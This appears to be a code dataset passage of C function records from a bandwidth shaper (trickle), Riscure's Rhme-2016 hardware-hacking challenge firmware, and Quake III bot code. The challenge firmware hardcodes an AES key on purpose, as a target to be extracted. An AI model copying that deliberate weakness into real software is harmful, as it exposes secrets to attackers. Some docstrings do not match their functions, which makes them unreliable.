(1.0 * ent * bs->pts);\n\t}\n\n\t/* XXX */\n\tif (delay < 0.0)\n\t\treturn (NULL);\n\n\ttv.tv_sec = delay;\n\ttv.tv_usec = (delay - tv.tv_sec) * 1000000L;\n\n\treturn (&tv);\n}", "path": "bwstat.c", "repo_name": "mariusae/trickle", "stars": 499, "license": "other", "language": "c", "size": 533}
{"docstring": "/*\n * Insert a tag-value combination from LINE (the equal sign is at POS)\n */\n", "func_signal": "static int\nconf_remove_now(char *section, char *tag)", "code": "{\n\tstruct conf_binding *cb, *next;\n\n\tfor (cb = LIST_FIRST (&conf_bindings[conf_hash (section)]); cb;\n\t     cb = next) {\n\t\tnext = LIST_NEXT (cb, link);\n\t\tif (strcasecmp (cb->section, section) == 0\n\t\t    && strcasecmp (cb->tag, tag) == 0) {\n\t\t\tLIST_REMOVE (cb, link);\n\t\t\tfree (cb->section);\n\t\t\tfree (cb->tag);\n\t\t\tfree (cb->value);\n\t\t\tfree (cb);\n\t\t\treturn (0);\n\t\t}\n\t}\n\treturn (1);\n}", "path": "conf.c", "repo_name": "mariusae/trickle", "stars": 499, "license": "other", "language": "c", "size": 533}
{"docstring": "/* Parse the mapped configuration file.  */\n", "func_signal": "static void\nconf_parse (int trans, char *buf, size_t sz)", "code": "{\n\tchar *cp = buf;\n\tchar *bufend = buf + sz;\n\tchar *line;\n\n\tline = cp;\n\twhile (cp < bufend) {\n\t\tif (*cp == '\\n') {\n\t\t\t/* Check for escaped newlines.  */\n\t\t\tif (cp > buf && *(cp - 1) == '\\\\')\n\t\t\t\t*(cp - 1) = *cp = ' ';\n\t\t\telse {\n\t\t\t\t*cp = '\\0';\n\t\t\t\tconf_parse_line (trans, line, cp - line);\n\t\t\t\tline = cp + 1;\n\t\t\t}\n\t\t}\n\t\tcp++;\n\t}\n\tif (cp != line)\n\t\twarnx(\"conf_parse: last line non-terminated, ignored.\");\n}", "path": "conf.c", "repo_name": "mariusae/trickle", "stars": 499, "license": "other", "language": "c", "size": 533}
{"docstring": "/* Decode a PEM encoded buffer.  */\n", "func_signal": "int\nconf_decode_base64 (u_int8_t *out, u_int32_t *len, u_char *buf)", "code": "{\n\tu_int32_t c = 0;\n\tu_int8_t c1, c2, c3, c4;\n\n\twhile (*buf) {\n\t\tif (*buf > 127 || (c1 = asc2bin[*buf]) == 255)\n\t\t\treturn (0);\n\t\tbuf++;\n\n\t\tif (*buf > 127 || (c2 = asc2bin[*buf]) == 255)\n\t\t\treturn (0);\n\t\tbuf++;\n\n\t\tif (*buf == '=') {\n\t\t\tc3 = c4 = 0;\n\t\t\tc++;\n\n\t\t\t/* Check last four bit */\n\t\t\tif (c2 & 0xF)\n\t\t\t\treturn (0);\n\n\t\t\tif (!strcmp (buf, \"==\"))\n\t\t\t\tbuf++;\n\t\t\telse\n\t\t\t\treturn (0);\n\t\t}\n\t\telse if (*buf > 127 || (c3 = asc2bin[*buf]) == 255)\n\t\t\treturn (0);\n\t\telse {\n\t\t\tif (*++buf == '=') {\n\t\t\t\tc4 = 0;\n\t\t\t\tc += 2;\n\n\t\t\t\t/* Check last two bit */\n\t\t\t\tif (c3 & 3)\n\t\t\t\t\treturn (0);\n\n\t\t\t\tif (strcmp (buf, \"=\"))\n\t\t\t\t\treturn (0);\n\n\t\t\t}\n\t\t\telse if (*buf > 127 || (c4 = asc2bin[*buf]) == 255)\n\t\t\t\treturn (0);\n\t\t\telse\n\t\t\t\tc += 3;\n\t\t}\n\n\t\tbuf++;\n\t\t*out++ = (c1 << 2) | (c2 >> 4);\n\t\t*out++ = (c2 << 4) | (c3 >> 2);\n\t\t*out++ = (c3 << 6) | c4;\n\t}\n\n\t*len = c;\n\treturn (1);\n\n}", "path": "conf.c", "repo_name": "mariusae/trickle", "stars": 499, "license": "other", "language": "c", "size": 533}
{"docstring": "/*\n * Insert a tag-value combination from LINE (the equal sign is at POS)\n * into SECTION of our configuration database.\n */\n", "func_signal": "static int\nconf_set_now (char *section, char *tag, char *value, int override,\n\t      int is_default)", "code": "{\n\tstruct conf_binding *node = 0;\n\n\tif (override)\n\t\tconf_remove_now (section, tag);\n\telse if (conf_get_str (section, tag)) {\n\t\tif (!is_default)\n\t\t\twarnx(\"conf_set: duplicate tag [%s]:%s, ignoring...\\n\",\n\t\t\t      section, tag);\n\t\treturn (1);\n\t}\n\n\tnode = calloc (1, sizeof *node);\n\tif (!node) {\n\t\twarn(\"conf_set: calloc (1, %d) failed\", sizeof *node);\n\t\treturn (1);\n\t}\n\tnode->section = strdup (section);\n\tnode->tag = strdup (tag);\n\tnode->value = strdup (value);\n\tnode->is_default = is_default;\n\n\tLIST_INSERT_HEAD (&conf_bindings[conf_hash (section)], node, link);\n\treturn (0);\n}", "path": "conf.c", "repo_name": "mariusae/trickle", "stars": 499, "license": "other", "language": "c", "size": 533}
{"docstring": "/* Return the string value denoted by TAG in section SECTION.  */\n", "func_signal": "char *\nconf_get_str (char *section, char *tag)", "code": "{\n\tstruct conf_binding *cb;\n\n\tfor (cb = LIST_FIRST (&conf_bindings[conf_hash (section)]); cb;\n\t     cb = LIST_NEXT (cb, link))\n\t\tif (strcasecmp (section, cb->section) == 0\n\t\t    && strcasecmp (tag, cb->tag) == 0)\n\t\t\treturn (cb->value);\n\n\treturn (0);\n}", "path": "conf.c", "repo_name": "mariusae/trickle", "stars": 499, "license": "other", "language": "c", "size": 533}
{"docstring": "/*\n * Parse the line LINE of SZ bytes.  Skip Comments, recognize section\n * headers and feed tag-value pairs into our configuration database.\n */\n", "func_signal": "static void\nconf_parse_line (int trans, char *line, size_t sz)", "code": "{\n\tchar *cp = line;\n\tint i;\n\tstatic char *section = 0;\n\tstatic int ln = 0;\n\n\tln++;\n\n\t/* Lines starting with '#' or ';' are comments.  */\n\tif (*line == '#' || *line == ';')\n\t\treturn;\n\n\t/* '[section]' parsing...  */\n\tif (*line == '[') {\n\t\tfor (i = 1; i < sz; i++)\n\t\t\tif (line[i] == ']')\n\t\t\t\tbreak;\n\t\tif (i == sz) {\n\t\t\twarnx(\"conf_parse_line: %d:\"\n\t\t\t      \"non-matched ']', ignoring until next section\",\n\t\t\t      ln);\n\t\t\tsection = 0;\n\t\t\treturn;\n\t\t}\n\t\tif (section)\n\t\t\tfree (section);\n\t\tsection = malloc (i);\n\t\tstrncpy (section, line + 1, i - 1);\n\t\tsection[i - 1] = '\\0';\n\t\treturn;\n\t}\n\n\t/* Deal with assignments.  */\n\tfor (i = 0; i < sz; i++)\n\t\tif (cp[i] == '=') {\n\t\t\t/* If no section, we are ignoring the lines.  */\n\t\t\tif (!section) {\n\t\t\t\twarnx(\"conf_parse_line: %d: ignoring line due to no section\",\n\t\t\t\t      ln);\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tline[strcspn (line, \" \\t=\")] = '\\0';\n\t\t\t/* XXX Perhaps should we not ignore errors?  */\n\t\t\tconf_set (trans, section, line,\n\t\t\t\t  line + i + 1 + strspn (line + i + 1, \" \\t\"), 0, 0);\n\t\t\treturn;\n\t\t}\n\n\t/* Other non-empty lines are wierd.  */\n\ti = strspn (line, \" \\t\");\n\tif (line[i])\n\t\twarnx(\"conf_parse_line: %d: syntax error\", ln);\n\n\treturn;\n}", "path": "conf.c", "repo_name": "mariusae/trickle", "stars": 499, "license": "other", "language": "c", "size": 533}
{"docstring": "/* Read a line from a stream to the buffer.  */\n", "func_signal": "int\nconf_get_line (FILE *stream, char *buf, u_int32_t len)", "code": "{\n\tint c;\n\n\twhile (len-- > 1) {\n\t\tc = fgetc (stream);\n\t\tif (c == '\\n') {\n\t\t\t*buf = 0;\n\t\t\treturn (1);\n\t\t}\n\t\telse if (c == EOF)\n\t\t\tbreak;\n\n\t\t*buf++ = c;\n\t}\n\n\t*buf = 0;\n\treturn (0);\n}", "path": "conf.c", "repo_name": "mariusae/trickle", "stars": 499, "license": "other", "language": "c", "size": 533}
{"docstring": "/*\n * XXX should winsz be per-update?\n */\n", "func_signal": "int\nbwstat_init(uint xwinsz)", "code": "{\n\tstruct bwstat *bs;\n\n\twinsz = xwinsz;\n\n\tTAILQ_INIT(&statq);\n\n\t/* First entry is the totals. */\n\tif ((bs = bwstat_new()) == NULL)\n\t\treturn (-1);\n\n\treturn (0);\n}", "path": "bwstat.c", "repo_name": "mariusae/trickle", "stars": 499, "license": "other", "language": "c", "size": 533}
{"docstring": "/* Queue a remove operation.  */\n", "func_signal": "int\nconf_remove (int transaction, char *section, char *tag)", "code": "{\n\tstruct conf_trans *node;\n\n\tnode = conf_trans_node (transaction, CONF_REMOVE);\n\tif (!node)\n\t\tgoto fail;\n\tnode->section = strdup (section);\n\tif (!node->section) {\n\t\twarn(\"conf_remove: strdup (\\\"%s\\\") failed\", section);\n\t\tgoto fail;\n\t}\n\tnode->tag = strdup (tag);\n\tif (!node->tag) {\n\t\twarn(\"conf_remove: strdup (\\\"%s\\\") failed\", tag);\n\t\tgoto fail;\n\t}\n\treturn (0);\n\n fail:\n\tif (node->section)\n\t\tfree (node->section);\n\tif (node)\n\t\tfree (node);\n\treturn (1);\n}", "path": "conf.c", "repo_name": "mariusae/trickle", "stars": 499, "license": "other", "language": "c", "size": 533}
{"docstring": "/*\n * These are adopted from the OpenBSD err*() and warn*() functions.\n */\n", "func_signal": "void\nerrv(int level, int eval, const char *fmt, ...)", "code": "{\n\tva_list ap;\n\t\n\tif (level > verbose)\n\t\texit(eval);\n\n\tva_start(ap, fmt);\n\tvprint(fmt, ap);\n\tva_end(ap);\n\texit(eval);\n}", "path": "print.c", "repo_name": "mariusae/trickle", "stars": 499, "license": "other", "language": "c", "size": 533}
{"docstring": "/*\n * XXX only do if isatty(); ...\n */\n", "func_signal": "void\nprint_dump(u_char *buf, int len)", "code": "{\n\tint i, j, goback;\n\n\tprintf(\"%s: \", __progname);\n\t\n\tfor (i = 0; i < len; ++i) {\n\t\tprintf(\"%02x \", buf[i]);\n\t\tif ((goback = i % 16) == 15 || i == len - 1) {\n\t\t\tfor (j = 15 - goback; j >= 0; j--) printf(\"   \");\n\t\t\tfor (j = i - goback; j <= i; j++)\n\t\t\t\tif (buf[j] > 31 && buf[j] < 127)\n\t\t\t\t\tprintf(\"%c\", buf[j]);\n\t\t\t\telse\n\t\t\t\t\tprintf(\".\");\n\t\t\tif (i != len - 1)\n\t\t\t\tprintf(\"\\n%s: \", __progname);\n\t\t} \n\t}\n\tprintf(\"\\n\");\n}", "path": "print.c", "repo_name": "mariusae/trickle", "stars": 499, "license": "other", "language": "c", "size": 533}
{"docstring": "/* Execute all queued operations for this transaction.  Cleanup.  */\n", "func_signal": "int\nconf_end (int transaction, int commit)", "code": "{\n\tstruct conf_trans *node, *next;\n\n\tfor (node = TAILQ_FIRST (&conf_trans_queue); node; node = next) {\n\t\tnext = TAILQ_NEXT (node, link);\n\t\tif (node->trans == transaction) {\n\t\t\tif (commit)\n\t\t\t\tswitch (node->op) {\n\t\t\t\tcase CONF_SET:\n\t\t\t\t\tconf_set_now (node->section, node->tag, node->value,\n\t\t\t\t\t\t      node->override, node->is_default);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CONF_REMOVE:\n\t\t\t\t\tconf_remove_now (node->section, node->tag);\n\t\t\t\t\tbreak;\n\t\t\t\tcase CONF_REMOVE_SECTION:\n\t\t\t\t\tconf_remove_section_now (node->section);\n\t\t\t\t\tbreak;\n\t\t\t\tdefault:\n\t\t\t\t\twarnx(\"conf_end: unknown operation: %d\", node->op);\n\t\t\t\t}\n\t\t\tTAILQ_REMOVE (&conf_trans_queue, node, link);\n\t\t\tif (node->section)\n\t\t\t\tfree (node->section);\n\t\t\tif (node->tag)\n\t\t\t\tfree (node->tag);\n\t\t\tif (node->value)\n\t\t\t\tfree (node->value);\n\t\t\tfree (node);\n\t\t}\n\t}\n\treturn (0);\n}", "path": "conf.c", "repo_name": "mariusae/trickle", "stars": 499, "license": "other", "language": "c", "size": 533}
{"docstring": "/**\n * @brief aes_setup Set the key from the flag value\n */\n", "func_signal": "void aes_setup(void)", "code": "{\n\tuint8_t aux[32] = {0xa9, 0xea, 0x57, 0xa7, 0xec, 0xfd, 0x4d, 0x2f, 0x55, 0x6c, 0x81, 0x87, 0x99, 0x3d, 0x7b, 0x29};\n\tint i;\n\n\tkey = (uint8_t*)malloc(AES_KEY_SIZE);\n\n\tfor (i = 0; i < AES_KEY_SIZE; i++) {\n\t\tkey[i] = aux[i];\n\t}\n\tmemset(aux, 0, sizeof(aux));\n}", "path": "src\\jungle\\jungle.c", "repo_name": "Riscure/Rhme-2016", "stars": 275, "license": "None", "language": "c", "size": 131}
{"docstring": "/**\n * @brief Transmit a string.\n * @param[in] s  Null terminated string to send\n */\n", "func_signal": "void usart_print(char *s)", "code": "{\n\twhile (*s != 0) {\n\t\tusart_send_byte( *(s++) );\n\n\t\t/* Let the VM breathe */\n\t\t_delay_ms(1);\n\t}\n}", "path": "src\\jungle\\jungle.c", "repo_name": "Riscure/Rhme-2016", "stars": 275, "license": "None", "language": "c", "size": 131}
{"docstring": "/**\n * @brief Check for incomming data.\n * @return 1 If there is data avaliable, 0 otherwise\n */\n", "func_signal": "uint8_t usart_data_available(void)", "code": "{\n\tif ( UCSR0A & (1 << RXC0) )\n\t\treturn 1;\n\treturn 0;\n}", "path": "src\\whac_the_mole\\whack_the_mole.c", "repo_name": "Riscure/Rhme-2016", "stars": 275, "license": "None", "language": "c", "size": 131}
{"docstring": "/**\n * @brief Transmit a string.\n * @param[in] s  Null terminated string to send\n */\n", "func_signal": "void usart_print(char *s)", "code": "{\n\t//PORTB ^= (1 << PORTB5);\n\n\twhile (*s != 0) {\n\t\tusart_send_byte( *(s++) );\n\n\t\t/* Let the VM breath */\n\t\t_delay_ms(1);\n\t}\n}", "path": "src\\jumpy\\jumpy.c", "repo_name": "Riscure/Rhme-2016", "stars": 275, "license": "None", "language": "c", "size": 131}
{"docstring": "/**\n * @brief Encrypt the message.\n */\n", "func_signal": "void encrypt(void)", "code": "{\n\taes_state_t data = (aes_state_t) inbuffer;\n\tuint32_t i;\n\n\taes_key_expansion(key);\n\taes_ecb_encrypt(data, key);\n\n\t/* Print morse representation on the screen. */\n\t//    for (i = 0; i < 16; i++) {\n\t//        morse_print(data[i]);\n\t//    }\n\tcli();\n\tfor (i = 0; i < 16; i++) {\n\t\tmorse_flash(data[i]);\n\t}\n\tsei();\n\t/* If this is enabled, the data can be corrupted everywhere\n\t* and it becomes TOO dificult to check if the fault is too\n\t* late.\n\t*/\n\t//    for (i = 0; i < 16; i++) {\n\t//         data[i] = 0;\n\t//    }\n}", "path": "src\\jungle\\jungle.c", "repo_name": "Riscure/Rhme-2016", "stars": 275, "license": "None", "language": "c", "size": 131}
{"docstring": "/**\n * @brief Send a single byte.\n * @param[in] byte  Byte to send\n */\n", "func_signal": "void usart_send_byte(uint8_t byte)", "code": "{\n\t/* Wait for empty transmit buffer */\n\twhile ( !(UCSR0A & (1 << UDRE0)) ) {\n\t}\n\n\t/* Send byte */\n\tUDR0 = byte;\n}", "path": "src\\whac_the_mole\\whack_the_mole.c", "repo_name": "Riscure/Rhme-2016", "stars": 275, "license": "None", "language": "c", "size": 131}
{"docstring": "/**\n * @brief execute the received command\n */\n", "func_signal": "void execute(void)", "code": "{\n\tencrypt();\n\tparse_flag = 0;\n}", "path": "src\\jungle\\jungle.c", "repo_name": "Riscure/Rhme-2016", "stars": 275, "license": "None", "language": "c", "size": 131}
{"docstring": "/**\n * @brief morse_print Send the ascii dash-dot representation on the UART\n * @param data  Data do send in binary\n *\n * If data is 0xFA, then the morse code for F is send, and then the\n * morse code for A.\n */\n", "func_signal": "void morse_print(uint8_t data)", "code": "{\n\tusart_print( (char *) mrs_table[ (data >> 4) & 0x0F ] );\n\tusart_print(\"   \");\n\tusart_print( (char *) mrs_table[ data & 0x0F ]);\n\tusart_print(\"   \");\n}", "path": "src\\jungle\\jungle.c", "repo_name": "Riscure/Rhme-2016", "stars": 275, "license": "None", "language": "c", "size": 131}
{"docstring": "/**\n * @brief Get incoming data.\n * @return Received byte.\n */\n", "func_signal": "uint8_t usart_recv_byte(void)", "code": "{\n\t/* Wait until data is available */\n\twhile ( !usart_data_available() ){\n\t}\n\n\t/* Read byte */\n\treturn UDR0;\n}", "path": "src\\whac_the_mole\\whack_the_mole.c", "repo_name": "Riscure/Rhme-2016", "stars": 275, "license": "None", "language": "c", "size": 131}
{"docstring": "/**\n * @brief Check for incomming data.\n * @return 1 If there is data avaliable, 0 otherwise\n */\n", "func_signal": "uint8_t usart_data_available(void)", "code": "{\n\tif ( UCSR0A & (1 << RXC0) )\n\t\treturn 1;\n\treturn 0;\n}", "path": "src\\jungle\\jungle.c", "repo_name": "Riscure/Rhme-2016", "stars": 275, "license": "None", "language": "c", "size": 131}
{"docstring": "/**\n * @brief UART receive interruption.\n *\n * Adds the received characters to te inBuffer and signals\n * when a LF character is received so the command can be\n * parsed.\n */\n", "func_signal": "ISR(USART_RX_vect)", "code": "{\n\tuint8_t data;\n\tdata = UDR0;\n\n\t/* CHR_LF signals end of command */\n\tif (data == CHR_LF) {\n\t\tpos_inbuffer = 0;\n\t\tparse_flag = 1;\n\n\t} else if (pos_inbuffer < INBUFFER_LEN) {\n\t\tinbuffer[pos_inbuffer] = data;\n\t\tpos_inbuffer++;\n\t}\n}", "path": "src\\jungle\\jungle.c", "repo_name": "Riscure/Rhme-2016", "stars": 275, "license": "None", "language": "c", "size": 131}
{"docstring": "/**\n * @brief Configure the USART0 port.\n */\n", "func_signal": "void serial_init(void)", "code": "{\n\t/* Set baud rate */\n\tUBRR0H = 0; //(uint8_t)(baud >> 8);\n\tUBRR0L = 12;//(uint8_t) baud;\n\n\tUCSR0A |= (1 << U2X0);\n\t/* Enable received and transmitter */\n\tUCSR0B = (1 << RXEN0) | (1 << TXEN0);\n\n\t/* Set frame format (8N1) */\n\tUCSR0C = (1 << UCSZ00) | (1 << UCSZ01);\n\tUCSR0C &= ~(1 << UMSEL00);\n\tUCSR0B |= (1 << RXCIE0);\n\tsei();\n}", "path": "src\\jungle\\jungle.c", "repo_name": "Riscure/Rhme-2016", "stars": 275, "license": "None", "language": "c", "size": 131}
{"docstring": "/**\n * @brief Configure the USART0 port.\n */\n", "func_signal": "void serial_init(void)", "code": "{\n\tUBRR0H = (uint8_t)0;\n\tUBRR0L = (uint8_t)51;\n\n\t/* Enable received and transmitter */\n\tUCSR0B = (1 << RXEN0) | (1 << TXEN0);\n\n\t/* Set frame format (8N1) */\n\tUCSR0C = (1 << UCSZ00) | (1 << UCSZ01);\n\tUCSR0C &= ~(1 << UMSEL00);\n\tUCSR0B |= (1 << RXCIE0);\n\t//sei();\n}", "path": "src\\jumpy\\jumpy.c", "repo_name": "Riscure/Rhme-2016", "stars": 275, "license": "None", "language": "c", "size": 131}
{"docstring": "/**\n * @brief morse_flash Flashes the led with a morse pattern.\n * @param data  Data to send in binary\n */\n", "func_signal": "void morse_flash(uint8_t data)", "code": "{\n\tuint8_t* morse_str;\n\tuint8_t signal;\n\tuint32_t e;\n\tconst uint32_t dot_time = 100;\n\n\t/* Send the most significant nibble */\n\tmorse_str = mrs_table[ (data >> 4) & 0x0F ];\n\twhile (*morse_str) {\n\t\tsignal = *morse_str;\n\t\tswitch (signal) {\n\t\tcase '-':\n\t\t\tPORTB ^= (1 << PORTB5);\n\t\t\tfor (e=dot_time * 3; e>0; e--);\n\t\t\tPORTB ^= (1 << PORTB5);\n\t\t\tbreak;\n\n\t\tcase '.':\n\t\t\tPORTB ^= (1 << PORTB5);\n\t\t\tfor (e=dot_time; e>0; e--);\n\t\t\tPORTB ^= (1 << PORTB5);\n\t\t\tbreak;\n\n\t\t}\n\t\tfor (e=dot_time; e>0; e--);\n\t\tmorse_str++;\n\t}\n\t/* At the end of the letter a silence of 3 dots is expected 3 */\n\tfor (e = dot_time *4; e > 0; e--);\n\n\t/* Send the second nibble */\n\tmorse_str = mrs_table[ data & 0x0F ];\n\n\twhile (*morse_str) {\n\t\tsignal = *morse_str;\n\t\tswitch (signal) {\n\t\tcase '-':\n\t\t\tPORTB ^= (1 << PORTB5);\n\t\t\tfor (e=dot_time * 3; e>0; e--);\n\t\t\tPORTB ^= (1 << PORTB5);\n\t\t\tbreak;\n\n\t\tcase '.':\n\t\t\tPORTB ^= (1 << PORTB5);\n\t\t\tfor (e=dot_time; e>0; e--);\n\t\t\tPORTB ^= (1 << PORTB5);\n\t\t\tbreak;\n\n\t\t}\n\t\tfor (e = dot_time; e > 0; e--);\n\t\tmorse_str++;\n\t}\n\t/* At the end of the letter a silence of 3 dots is expected 3 */\n\tfor (e = dot_time * 4; e > 0; e--);\n\n}", "path": "src\\jungle\\jungle.c", "repo_name": "Riscure/Rhme-2016", "stars": 275, "license": "None", "language": "c", "size": 131}
{"docstring": "/**\n * @brief Get incoming data.\n * @return Received byte.\n */\n", "func_signal": "uint8_t usart_recv_byte(void)", "code": "{\n\t/* Wait until data is available */\n\twhile ( !usart_data_available() ){\n\t}\n\n\t/* Read byte */\n\treturn UDR0;\n}", "path": "src\\jungle\\jungle.c", "repo_name": "Riscure/Rhme-2016", "stars": 275, "license": "None", "language": "c", "size": 131}
{"docstring": "/**\n * @brief Transmit a string.\n * @param[in] s  Null terminated string to send\n */\n", "func_signal": "void usart_print(char *s)", "code": "{\n\t//PORTB ^= (1 << PORTB5);\n\n\twhile (*s != 0) {\n\t\tusart_send_byte( *(s++) );\n\n\t\t/* Let the VM breath */\n\t\t_delay_ms(1);\n\t}\n}", "path": "src\\whac_the_mole\\whack_the_mole.c", "repo_name": "Riscure/Rhme-2016", "stars": 275, "license": "None", "language": "c", "size": 131}
{"docstring": "/**\n * @brief Send a single byte.\n * @param[in] byte  Byte to send\n */\n", "func_signal": "void usart_send_byte(uint8_t byte)", "code": "{\n\t/* Wait for empty transmit buffer */\n\twhile ( !(UCSR0A & (1 << UDRE0)) ) {\n\t}\n\n\t/* Send byte */\n\tUDR0 = byte;\n}", "path": "src\\jumpy\\jumpy.c", "repo_name": "Riscure/Rhme-2016", "stars": 275, "license": "None", "language": "c", "size": 131}
{"docstring": "/**\n * @brief Check for incomming data.\n * @return 1 If there is data avaliable, 0 otherwise\n */\n", "func_signal": "uint8_t usart_data_available(void)", "code": "{\n\tif ( UCSR0A & (1 << RXC0) )\n\t\treturn 1;\n\treturn 0;\n}", "path": "src\\jumpy\\jumpy.c", "repo_name": "Riscure/Rhme-2016", "stars": 275, "license": "None", "language": "c", "size": 131}
{"docstring": "/**\n * @brief Display the help menu.\n */\n", "func_signal": "void help(void)", "code": "{\n\tusart_print(\"                            \\r\\n\");\n\tusart_print(\"====== Jungle Assistance System V1.0 ======\\r\\n\\r\\n\");\n\tusart_print(\"This board will help you get out of the jungle in no time!\\r\\n\");\n\tusart_print(\"Write a message of maximum 16 bytes asking for help, the message\\r\\n\");\n\tusart_print(\"will be transmitted _encrypted_ using the LED and a secret key.\\r\\n\");\n\tusart_print(\"The key will remain secure even if the JAS falls into enemy\\r\\n\\r\");\n\tusart_print(\"hands (We hope so).\\r\\n\\r\\n\");\n\tusart_print(\"As the LED is not powerful enough please aim carefuly.\\r\\n\");\n\n}", "path": "src\\jungle\\jungle.c", "repo_name": "Riscure/Rhme-2016", "stars": 275, "license": "None", "language": "c", "size": 131}
{"docstring": "/**\n * @brief Configure the USART0 port.\n */\n", "func_signal": "void serial_init(void)", "code": "{\n\t/* Set baud rate */\n\t//uint16_t baud = BAUD_PRESCALER;\n\tUBRR0H = (uint8_t)0;\n\tUBRR0L = (uint8_t)51;\n\n\t/* Enable received and transmitter */\n\tUCSR0B = (1 << RXEN0) | (1 << TXEN0);\n\n\t/* Set frame format (8N1) */\n\tUCSR0C = (1 << UCSZ00) | (1 << UCSZ01);\n\tUCSR0C &= ~(1 << UMSEL00);\n\tUCSR0B |= (1 << RXCIE0);\n\t//sei();\n}", "path": "src\\whac_the_mole\\whack_the_mole.c", "repo_name": "Riscure/Rhme-2016", "stars": 275, "license": "None", "language": "c", "size": 131}
{"docstring": "//end of the function AAS_AllocAASLink\n//===========================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "void AAS_DeAllocAASLink(aas_link_t *link)", "code": "{\n\tif (aasworld.freelinks) aasworld.freelinks->prev_ent = link;\n\tlink->prev_ent = NULL;\n\tlink->next_ent = aasworld.freelinks;\n\tlink->prev_area = NULL;\n\tlink->next_area = NULL;\n\taasworld.freelinks = link;\n\tnumaaslinks++;\n}", "path": "src\\engine\\botlib\\be_aas_sample.c", "repo_name": "kennyalive/Quake-III-Arena-Kenny-Edition", "stars": 276, "license": "gpl-2.0", "language": "c", "size": 10185}
{"docstring": "//end of the function AAS_PointInsideFace\n//===========================================================================\n// returns the ground face the given point is above in the given area\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "aas_face_t *AAS_AreaGroundFace(int areanum, vec3_t point)", "code": "{\n\tint i, facenum;\n\tvec3_t up = {0, 0, 1};\n\tvec3_t normal;\n\taas_area_t *area;\n\taas_face_t *face;\n\n\tif (!aasworld.loaded) return NULL;\n\n\tarea = &aasworld.areas[areanum];\n\tfor (i = 0; i < area->numfaces; i++)\n\t{\n\t\tfacenum = aasworld.faceindex[area->firstface + i];\n\t\tface = &aasworld.faces[abs(facenum)];\n\t\t//if this is a ground face\n\t\tif (face->faceflags & FACE_GROUND)\n\t\t{\n\t\t\t//get the up or down normal\n\t\t\tif (aasworld.planes[face->planenum].normal[2] < 0) VectorNegate(up, normal);\n\t\t\telse VectorCopy(up, normal);\n\t\t\t//check if the point is in the face\n\t\t\tif (AAS_InsideFace(face, normal, point, 0.01f)) return face;\n\t\t} //end if\n\t} //end for\n\treturn NULL;\n}", "path": "src\\engine\\botlib\\be_aas_sample.c", "repo_name": "kennyalive/Quake-III-Arena-Kenny-Edition", "stars": 276, "license": "gpl-2.0", "language": "c", "size": 10185}
{"docstring": "//end of the function AAS_BoxOriginDistanceFromPlane\n//===========================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "qboolean AAS_AreaEntityCollision(int areanum, vec3_t start, vec3_t end,\n\t\t\t\t\t\t\t\t\t\tint presencetype, int passent, aas_trace_t *trace)", "code": "{\n\tint collision;\n\tvec3_t boxmins, boxmaxs;\n\taas_link_t *link;\n\tbsp_trace_t bsptrace;\n\n\tAAS_PresenceTypeBoundingBox(presencetype, boxmins, boxmaxs);\n\n\tCom_Memset(&bsptrace, 0, sizeof(bsp_trace_t)); //make compiler happy\n\t//assume no collision\n\tbsptrace.fraction = 1;\n\tcollision = qfalse;\n\tfor (link = aasworld.arealinkedentities[areanum]; link; link = link->next_ent)\n\t{\n\t\t//ignore the pass entity\n\t\tif (link->entnum == passent) continue;\n\t\t//\n\t\tif (AAS_EntityCollision(link->entnum, start, boxmins, boxmaxs, end,\n\t\t\t\t\t\t\t\t\t\t\t\tCONTENTS_SOLID|CONTENTS_PLAYERCLIP, &bsptrace))\n\t\t{\n\t\t\tcollision = qtrue;\n\t\t} //end if\n\t} //end for\n\tif (collision)\n\t{\n\t\ttrace->startsolid = bsptrace.startsolid;\n\t\ttrace->ent = bsptrace.ent;\n\t\tVectorCopy(bsptrace.endpos, trace->endpos);\n\t\ttrace->area = 0;\n\t\ttrace->planenum = 0;\n\t\treturn qtrue;\n\t} //end if\n\treturn qfalse;\n}", "path": "src\\engine\\botlib\\be_aas_sample.c", "repo_name": "kennyalive/Quake-III-Arena-Kenny-Edition", "stars": 276, "license": "gpl-2.0", "language": "c", "size": 10185}
{"docstring": "//end of the function AAS_PointAreaNum\n//===========================================================================\n//\n// Parameter:\t\t\t-\n// Returns:\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "int AAS_PointReachabilityAreaIndex( vec3_t origin )", "code": "{\n\tint areanum, cluster, i, index;\n\n\tif (!aasworld.initialized)\n\t\treturn 0;\n\n\tif ( !origin )\n\t{\n\t\tindex = 0;\n\t\tfor (i = 0; i < aasworld.numclusters; i++)\n\t\t{\n\t\t\tindex += aasworld.clusters[i].numreachabilityareas;\n\t\t} //end for\n\t\treturn index;\n\t} //end if\n\n\tareanum = AAS_PointAreaNum( origin );\n\tif ( !areanum || !AAS_AreaReachability(areanum) )\n\t\treturn 0;\n\tcluster = aasworld.areasettings[areanum].cluster;\n\tareanum = aasworld.areasettings[areanum].clusterareanum;\n\tif (cluster < 0)\n\t{\n\t\tcluster = aasworld.portals[-cluster].frontcluster;\n\t\tareanum = aasworld.portals[-cluster].clusterareanum[0];\n\t} //end if\n\n\tindex = 0;\n\tfor (i = 0; i < cluster; i++)\n\t{\n\t\tindex += aasworld.clusters[i].numreachabilityareas;\n\t} //end for\n\tindex += areanum;\n\treturn index;\n}", "path": "src\\engine\\botlib\\be_aas_sample.c", "repo_name": "kennyalive/Quake-III-Arena-Kenny-Edition", "stars": 276, "license": "gpl-2.0", "language": "c", "size": 10185}
